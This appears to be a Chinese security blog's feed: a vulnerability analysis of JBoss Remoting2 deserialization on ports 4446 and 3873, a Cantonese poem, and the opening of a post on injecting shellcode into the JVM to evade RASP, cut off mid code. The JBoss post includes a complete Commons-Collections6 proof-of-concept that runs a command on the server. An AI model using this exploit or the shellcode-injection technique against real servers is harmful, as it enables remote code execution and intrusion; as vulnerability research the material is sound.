    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间读了<a href="https://twitter.com/y4er_chabug" target="_blank" rel="noopener">@Y4ar</a>师傅分析JBoss的文章和《A little bit beyong \xAC\xED》的原文，起初简单的看下，以为是普通的反序列漏洞，后面经过分析才察觉是关于JBoss的<strong>Remoting2协议</strong>的漏洞。本文以JBoss AS 6.1.0.Final为例，主要分析与<a href="https://twitter.com/y4er_chabug" target="_blank" rel="noopener">@Y4ar</a>师傅稍有不同的一种反序列化触发方式。</p><a id="more"></a><h2 id="Remoting2协议"><a href="#Remoting2协议" class="headerlink" title="Remoting2协议"></a>Remoting2协议</h2><p>Remoting服务端的框架如下图所示，在接受收到从网络传输过来的数据后，数据会由<code>UnMarshaller</code>转换调用请求对象，传送到<code>ServerInvoker</code>，再由其根据调用请求对象的信息传送到相应的调用实现类<code>InvocationHandler</code>。</p><p><code>InvocationHandler</code>执行完的返回结果，会经由<code>ServerInvoker</code>传到<code>Marshaller</code>，再由<code>Marshaller</code>转换为网络中传输的数据，传回给调用的客户端。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/design_server.jpg" alt></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从粗略浏览文章获取到的信息来看，漏洞存在于3873和4446端口。那么直接下断点在<code>ServerSocket</code>，往前回溯几层，可以看到分别是由<code>org.jboss.remoting.transport.Connector#start</code>方法和<code>org.jboss.remoting.transport.socket.SocketServerInvoker#start</code>开启的监听端口。在<code>SocketServerInvoker</code>对象中的<code>props</code>属性可以看到自定义的编码、解码工具类：<code>InvocationMarshaller</code>和<code>InvocationUnMarshaller</code>。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 190456.png" alt="屏幕截图 2022-05-24 190456"></p><p>在后端框架中<code>Connector</code>充当着管理<code>ServerInvoker</code>的角色，并为<code>ServerInvoker</code>添加<code>InvocationHandler</code>，其<code>addInvocationHandler</code>就是用来实现该功能的。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> ServerInvocationHandler <span class="hljs-title">addInvocationHandler</span><span class="hljs-params">(String subsystem, <span class="hljs-keyword">final</span> ServerInvocationHandler handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.invoker == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"You may only add handlers once the Connector is created (via create() method)."</span>);</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">                handler.setMBeanServer(Connector.<span class="hljs-keyword">this</span>.server);</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.invoker.addInvocationHandler(subsystem, handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于供Remotoing客户端调用的<code>ServerInvocationHandler</code>实现类众多，包括各种各样协议和使用场景。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 193836.png" alt></p><p>基于<code>Connector</code>的功能，我们在其<code>addInvocationHandler</code>方法处下断点，可以得出JBoss所使用到的<code>InvocationHandler</code>。在默认配置下，实测只会使用到以下五个<code>ServerInvocationHandler</code>。其中<code>AOPRemotingInvocationHandler</code>类配置在3873端口，其余四个配置在4446端口。</p><ul><li>org.jboss.profileservice.remoting.ProfileServiceInvocationHandler</li><li>org.jboss.aspects.remoting.AOPRemotingInvocationHandler</li><li>org.jboss.profileservice.management.upload.remoting.DeployHandler</li><li>org.jboss.invocation.unified.server.UnifiedInvoker</li><li>org.jboss.deployment.remoting.DeployHandler</li></ul><p>从网上找到一个客户端的Demo代码，没有设置<code>subsystem</code>名称，默认就进到了4446端口下的第一个<code>InvocationHandler</code>。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="hljs-keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">import</span> org.jboss.remoting.Client;  </span><br><span class="line"><span class="hljs-keyword">import</span> org.jboss.remoting.InvokerLocator;  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClientTest</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;  </span><br><span class="line">        String locatorURI = <span class="hljs-string">"socket://192.168.78.132:4446"</span>;  </span><br><span class="line">        String params = <span class="hljs-string">"/?backlog=50&amp;numAcceptThreads=30&amp;maxPoolSize=30&amp;clientMaxPoolSize=30&amp;clientLeasePeriod=10000&amp;timeout=8000"</span>;  </span><br><span class="line">        locatorURI += params;  </span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;  </span><br><span class="line">            InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);  </span><br><span class="line">            Client client = <span class="hljs-keyword">new</span> Client(locator,ServerHandle.class.getName());  </span><br><span class="line">            client.connect();  </span><br><span class="line">            client.invoke(<span class="hljs-string">"jhb "</span>,<span class="hljs-keyword">new</span> HashMap&lt;String,String&gt;());  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>org.jboss.deployment.remoting.DeployHandler#invoke</code>方法，其逻辑是从<code>InvocationRequest</code>获取参数和载荷，再根据参数值调用相应的方法。其中参数的值就是客户端中调用<code>invoke</code>方法传的值。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 204600.png" alt></p><p>来到<code>InvocationRequest</code>的定义处，它实现了<code>Serializable</code>，并且<code>getParameter</code>和<code>getRequestPayload</code>方法获取到的属性的类型分别为<code>Object</code>和<code>Map</code>。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-30 151243.png" alt></p><p>这里直接在调用<code>Client</code>的<code>invoke</code>方法时，<code>param</code>或<code>matedata</code>参数传入CC6的对象，即可触发反序列化漏洞。在调用栈中从自定义的解码工具类<code>InvocationUnMarshaller</code>开始，中间没有反序列化类黑白名单等防护措施，一路来到<code>ObjectInputStream</code>的<code>readObject</code>方法反序列化还原CC6对象。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-30 153557.png" alt></p><p>另一个存在漏洞的端口3873，调用栈中反序列化是从<code>SerializableUnMatshaller</code>开始，但最终过程是一样的。</p><p>最终完整POC如下：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        makeInvocation(<span class="hljs-string">"socket://192.168.78.155:4446/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeInvocation</span><span class="hljs-params">(String locatorURI)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Calling remoting server with locator uri of: "</span> + locatorURI);</span><br><span class="line"></span><br><span class="line">        Client remotingClient = <span class="hljs-keyword">new</span> Client(locator);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,Object&gt; mateMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        mateMap.put(<span class="hljs-string">"test"</span>,ApacheCommonsCollections6.getObject());</span><br><span class="line">        remotingClient.connect();</span><br><span class="line">        remotingClient.invoke(mateMap);</span><br><span class="line">        remotingClient.invoke(<span class="hljs-string">"jhb "</span>,mateMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApacheCommonsCollections6</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] realChain = <span class="hljs-keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"whoami"</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(realChain);</span><br><span class="line">        Map innermap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outermap, <span class="hljs-string">"mykey"</span>);</span><br><span class="line">        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);</span><br><span class="line">        hs.add(<span class="hljs-string">"diggid"</span>);</span><br><span class="line">        Field mapField = Class.forName(<span class="hljs-string">"java.util.HashSet"</span>).getDeclaredField(<span class="hljs-string">"map"</span>);</span><br><span class="line">        mapField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        HashMap hm = (HashMap) mapField.get(hs);</span><br><span class="line">        Field tableField = Class.forName(<span class="hljs-string">"java.util.HashMap"</span>).getDeclaredField(<span class="hljs-string">"table"</span>);</span><br><span class="line">        tableField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        Object[] tableArray = (Object[]) tableField.get(hm);</span><br><span class="line">        Object table = tableArray[<span class="hljs-number">0</span>];</span><br><span class="line">        Field key = table.getClass().getDeclaredField(<span class="hljs-string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        key.set(table, tme);</span><br><span class="line">        <span class="hljs-keyword">return</span> hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="随便看看"><a href="#随便看看" class="headerlink" title="随便看看"></a>随便看看</h2><p>前面有说到remoting2除了socket外，还支持其他一些协议，但默认模式下基于socket协议的remoting2协议被用到。不过其中的<code>WebInvoctonHandler</code>还是挺吸引人的。看了JBoss的文档，发现有关于这个InvocationHandler的介绍，它可以通过http协议进行反序列化。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleClient</span> </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// Default locator values</span></span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String transport = <span class="hljs-string">"http"</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String host = <span class="hljs-string">"localhost"</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> port = <span class="hljs-number">5400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeInvocation</span><span class="hljs-params">(String locatorURI)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="hljs-comment">// create InvokerLocator with the url type string</span></span><br><span class="line">        <span class="hljs-comment">// indicating the target remoting server to call upon.</span></span><br><span class="line">        InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Calling remoting server with locator uri of: "</span> + locatorURI);</span><br><span class="line"></span><br><span class="line">        Client remotingClient = <span class="hljs-keyword">new</span> Client(locator);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// make invocation on remoting server and send complex data object</span></span><br><span class="line">        <span class="hljs-comment">// by default, the remoting http client invoker will use method type of POST,</span></span><br><span class="line">        <span class="hljs-comment">// which is needed when ever sending objects to the server.  So no metadata map needs</span></span><br><span class="line">        <span class="hljs-comment">// to be passed to the invoke() method.</span></span><br><span class="line">        Object response = remotingClient.invoke(<span class="hljs-keyword">new</span> ComplexObject(<span class="hljs-number">2</span>, <span class="hljs-string">"foo"</span>, <span class="hljs-keyword">true</span>), <span class="hljs-keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making http POST request and sending a complex data object:\n"</span> + response);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map metadata = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        <span class="hljs-comment">// set the metadata so remoting client knows to use http GET method type</span></span><br><span class="line">        metadata.put(<span class="hljs-string">"TYPE"</span>, <span class="hljs-string">"GET"</span>);</span><br><span class="line">        <span class="hljs-comment">// not actually sending any data to the remoting server, just want to get its response</span></span><br><span class="line">        response = remotingClient.invoke((Object) <span class="hljs-keyword">null</span>, metadata);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making GET request:\n"</span> + response);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// now set type back to POST and send a plain text based request</span></span><br><span class="line">        metadata.put(<span class="hljs-string">"TYPE"</span>, <span class="hljs-string">"POST"</span>);</span><br><span class="line">        response = remotingClient.invoke(WebInvocationHandler.STRING_RETURN_PARAM, metadata);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making http POST request and sending a text based request:\n"</span> + response);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// notice are getting custom response code and message set by web invocation handler</span></span><br><span class="line">        Integer responseCode = (Integer) metadata.get(HTTPMetadataConstants.RESPONSE_CODE);</span><br><span class="line">        String responseMessage = (String) metadata.get(HTTPMetadataConstants.RESPONSE_CODE_MESSAGE);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Response code from server: "</span> + responseCode);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Response message from server: "</span> + responseMessage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然在JBoss这里用到<code>WebInvoctonHandler</code>，但是根据JBoss的Demo配置文件给出的路径<code>/servlet-invoker/ServerInvokerServlet</code>，可以查到基于JBoss开发的JBoss Operations Network存在关于<code>WebInvoctonHandler</code>的漏洞，CVE编号为CVE-2016-3737。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了JBoss其他反序列化漏洞、4446和3873这两个端口漏洞，感觉JBoss就像个筛子，特别是Remoting这个协议。后面在JBoss EAP 6.x和JBoss/Wildfly AS 7.x及往后版本，JBoss/Wildfly已默认不使用remoting2协议，而是使用了引入身份认证机制的remoting3协议。感觉remoting3协议可分析看看也没有什么漏洞，但最坑的是这么多年过去了，remoting3竟然连份文档都没有。。。</p><p>文中若有什么错误的地方，恳请各位师傅斧正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/" target="_blank" rel="noopener">https://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/</a></p><p><a href="https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/" target="_blank" rel="noopener">https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/</a></p><p><a href="https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/" target="_blank" rel="noopener">https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/</a></p><p><a href="https://www.tenable.com/security/research/tra-2016-22" target="_blank" rel="noopener">https://www.tenable.com/security/research/tra-2016-22</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间读了&lt;a href=&quot;https://twitter.com/y4er_chabug&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@Y4ar&lt;/a&gt;师傅分析JBoss的文章和《A little bit beyong \xAC\xED》的原文，起初简单的看下，以为是普通的反序列漏洞，后面经过分析才察觉是关于JBoss的&lt;strong&gt;Remoting2协议&lt;/strong&gt;的漏洞。本文以JBoss AS 6.1.0.Final为例，主要分析与&lt;a href=&quot;https://twitter.com/y4er_chabug&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@Y4ar&lt;/a&gt;师傅稍有不同的一种反序列化触发方式。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
    <category term="JBoss" scheme="http://127.0.0.1/tags/JBoss/"/>
    
    <category term="remoting" scheme="http://127.0.0.1/tags/remoting/"/>
    
  </entry>
  
  <entry>
    <title>惊回晓梦忆秋娟</title>
    <link href="http://127.0.0.1/2022/04/25/%E6%83%8A%E5%9B%9E%E6%99%93%E6%A2%A6%E5%BF%86%E7%A7%8B%E5%A8%9F/"/>
    <id>http://127.0.0.1/2022/04/25/%E6%83%8A%E5%9B%9E%E6%99%93%E6%A2%A6%E5%BF%86%E7%A7%8B%E5%A8%9F/</id>
    <published>2022-04-25T14:10:53.000Z</published>
    <updated>2022-06-02T03:51:59.652Z</updated>
    
    <content type="html"><![CDATA[<p>惊回晓梦，鹤唳声声，又声声寒角吹遍江城，隔岸蒹葭人寂静，废池乔木也厌言兵，昨夜醉乡难酩酊，今朝歧路未分明，樊川落魄悲同命，情到深时一死轻，重还有 约但系期无定，又怕赢得青楼薄幸名，辗转思量心自省，都系文章负我我负卿卿，估话钟鼎山林虽则皆幻影，有个风尘知已不负我生平，怎想两月绸缪如画饼，只换得一船离恨独对数峰青，正系素愿空留明珠侍聘，柔丝自缚慧剑无灵，韶华如梦终须认，争教红泪不成冰，你愿化蝶相寻但系谁为引领，你都未知何处我又要登程。</p><p>征途昼永，我又倚蓬搵，你睇荒村黄叶又近重阳，记得去年今日尚作非非想，想话神仙唔愿愿做鸳鸯，水暖春江同荡漾，不管人间离合世态炎凉，只要患难相扶欢愉共享，生时成对死亦成双，我话系前世姻缘你话系冤孽账，只怨奴奴生错一副软心肠，怕我太过多情会容易别向，遇着浮花浪蕊又话怜香，我愿忏悔往日疏狂重求你 见谅，你种真情真义令我没齿也难忘，只望青云有路人无恙，有日荣归衣锦报答红妆，个阵翠绕珠围不复当年个样，枝头飞上等你气吐名扬，今日相守都唔未能重存乜野奢望，我亦寒枝拣尽鬓染秋霜，但愿名花有主早日除魔障，愿你早日除魔障，更愿交还恩爱去礼空王。</p><p>飘零去，你都莫问前因，只见半山残照一个愁人，去路茫茫不禁悲来阵阵，前尘惘惘惹我泪落纷纷，仍是念念不忘心相印，尚有几回肠断几度销云，本想学投笔从戎图发奋，却被儒冠误了我有志难伸，想学一棹五湖同遁隐，却被妖纷笼遍远无垠，想学飞蛾破茧不复情丝困，却被一灯红焰又焚身，正系了得相思难了恨，梦来何处更为云，重讲乜石烂海枯情不泯，就算重逢有日已是负义忘恩，今日倚楼人远天涯近，呢件青衫曾染我地话别啼痕，襟前有两瓣系你唇脂晕，几度雨淋日晒而家都认唔真，你睇沉沉暮霭西风紧，南飞北雁怕向客中闻，平安未报自问心何忍，空余泪眼望断黄昏，又听得疏钟几杵好似来相引，引我都菩提树下莫恋红尘，草际秋虫声渐哽，只见隔林一点佛前灯，佛相庄严灯又暗，愧我殉情割爱两无能，虽则我佛慈悲都系难恕薄幸，甘为羁旅了却残生，世间何物堪酬赠，心耿耿，从此飘萍和断梗，能许深情默约句句都无凭。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;惊回晓梦，鹤唳声声，又声声寒角吹遍江城，隔岸蒹葭人寂静，废池乔木也厌言兵，昨夜醉乡难酩酊，今朝歧路未分明，樊川落魄悲同命，情到深时一死轻，重还有 约但系期无定，又怕赢得青楼薄幸名，辗转思量心自省，都系文章负我我负卿卿，估话钟鼎山林虽则皆幻影，有个风尘知已不负我生平，怎想两月</summary>
      
    
    
    
    <category term="日常" scheme="http://127.0.0.1/categories/日常/"/>
    
    
  </entry>
  
  <entry>
    <title>JVM Shellcode注入探索</title>
    <link href="http://127.0.0.1/2022/03/22/JVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2/"/>
    <id>http://127.0.0.1/2022/03/22/JVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2/</id>
    <published>2022-03-22T14:25:53.000Z</published>
    <updated>2022-03-22T15:55:55.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着RASP技术的发展，普通webshell已经很难有用武之地，甚至是各种内存马也逐渐捉襟见肘。秉承着《<a href="https://www.anquanke.com/post/id/214435" target="_blank" rel="noopener">JSP Webshell那些事——攻击篇（上）</a>》中向下走的思路，存不存在一种在Java代码中执行机器码的方法呢？答案是肯定的，常见的注入方式有JNI、JNA和利用JDK自带的Native方法等，其中笔者还找到了一种鲜有文章介绍的，基于HotSpot虚拟机，且较为通用的注入方法。</p><a id="more"></a><h2 id="基于JNI"><a href="#基于JNI" class="headerlink" title="基于JNI"></a>基于JNI</h2><p>Java底层虽然是C/C++实现的，但不能直接执行C/C++代码。若想要执行C/C++的代码，一般得通过JNI，即Java本地调用（Java Native Interface），加载JNI链接库，调用Native方法实现。</p><p>Cobalt Strike官网博客上有一篇《<a href="https://www.cobaltstrike.com/blog/how-to-inject-shellcode-from-java/" target="_blank" rel="noopener">如何从Java注入shellcode</a>》的文章，便是基于JNI实现，通过Native方法调用C/C++代码将shellcode注入到内存中。</p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//C/C++代码中声明的函数对应Demo#inject本地方法</span></span><br><span class="line"><span class="hljs-function">JNIEXPORT <span class="hljs-keyword">void</span> JNICALL <span class="hljs-title">Java_Demo_inject</span><span class="hljs-params">(JNIEnv * env, jobject object, jbyteArray jdata)</span> </span>&#123;</span><br><span class="line">   jbyte * data = (*env)-&gt;GetByteArrayElements(env, jdata, <span class="hljs-number">0</span>);</span><br><span class="line">   jsize length = (*env)-&gt;GetArrayLength(env, jdata);</span><br><span class="line">   inject((LPCVOID)data, (SIZE_T)length);</span><br><span class="line">   (*env)-&gt;ReleaseByteArrayElements(env, jdata, data, <span class="hljs-number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 